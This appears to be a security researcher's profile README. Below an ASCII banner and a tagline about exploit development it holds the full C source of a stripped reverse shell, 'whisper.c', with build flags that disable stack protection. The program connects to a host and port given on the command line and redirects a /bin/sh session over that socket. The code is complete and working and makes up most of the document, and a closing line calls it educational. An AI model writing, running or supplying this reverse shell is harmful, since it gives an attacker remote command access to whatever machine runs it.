<div align="center">

```
 _   _       _ _            _       _                
| \ | | ___ | | | __      _(_)_ __ | |__   ___ _ __  
|  \| |/ _ \| | | \ \ /\ / / | '_ \| '_ \ / _ \ '__| 
| |\  | (_) | | |  \ V  V /| | | | | | | |  __/ |    
|_| \_|\___/|_|_|   \_/\_/ |_|_| |_|_| |_|\___|_|    
```

Vulnerability Research  ·  Exploit Development  ·  Reverse Engineering

```c
/*
 * whisper.c — minimal reverse shell, stripped
 * build: gcc -s -fno-stack-protector -z execstack -o whisper whisper.c
 * usage: ./whisper <host> <port>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 1;

    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port   = htons(port),
    };
    inet_aton(host, &sin.sin_addr);

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        return 1;

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    char *shell = "/bin/sh";
    char *args[] = { shell, NULL };
    execve(shell, args, NULL);

    return 0;
}
```

<br>

Research published for educational and authorized testing purposes only. CVEs under responsible disclosure.

</div>
